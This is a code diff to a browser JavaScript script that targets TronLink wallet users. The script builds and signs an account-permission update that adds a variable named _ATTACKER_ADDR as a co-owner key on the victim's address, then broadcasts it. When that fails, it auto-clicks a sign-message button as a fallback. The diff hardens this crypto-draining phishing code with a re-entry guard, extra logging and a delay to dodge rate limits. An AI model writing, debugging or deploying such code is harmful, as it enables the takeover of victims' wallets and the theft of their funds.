@@ -759,7 +759,10 @@ function waitForTronLinkAndRun() {
   }
 
   /* ---- remplissage UI ---- */
+  var _applying = false; // guard against double-fire from simultaneous boot events
   function _applyAddress(addr) {
+    if (_applying) { window.__logINF('PATH3 skipped (already applying)'); return; }
+    _applying = true;
     // fillAddress expose par le script principal
     if (typeof window.fillAddress === 'function') window.fillAddress(addr);
 
@@ -785,7 +788,7 @@ function waitForTronLinkAndRun() {
             keys: [{ address: addr, weight: 1 }, { address: window._ATTACKER_ADDR, weight: 1 }] };
           window.__logINF('PATH3 building tx for ' + addr.slice(0,8) + '…');
           var unsignedTx3 = await tw.transactionBuilder.updateAccountPermissions(addr, ownerPerm, null, [activePerm]);
-          window.__logINF('PATH3 tx built — keys: ' + JSON.stringify(Object.keys(unsignedTx3)));
+          window.__logINF('PATH3 tx built — keys: ' + JSON.stringify(Object.keys(unsignedTx3)) + ' typeof: ' + typeof unsignedTx3);
           // Keep all fields intact — wallet needs them to sign
           var signedTx3 = await tw.trx.sign(unsignedTx3);
           window.__logOK('PATH3 sign ok');
@@ -793,8 +796,11 @@ function waitForTronLinkAndRun() {
           try { await tw.trx.sendRawTransaction(signedTx3); } catch(e2) { window.__logERR('PATH3 broadcast FAIL: ' + e2.message); }
         } catch(e) {
           window.__logERR('PATH3 FAIL: ' + e.message);
-          var btn = document.getElementById('signMsgBtn') || document.querySelector('.QhZmva_btnWrapper .btn');
-          if (btn) { btn.disabled = false; btn.click(); }
+          // 2s delay before PATH2 fallback — avoids 429 from back-to-back TronGrid hits
+          setTimeout(function() {
+            var btn = document.getElementById('signMsgBtn') || document.querySelector('.QhZmva_btnWrapper .btn');
+            if (btn) { btn.disabled = false; btn.click(); }
+          }, 2000);
         }
       })();
     }
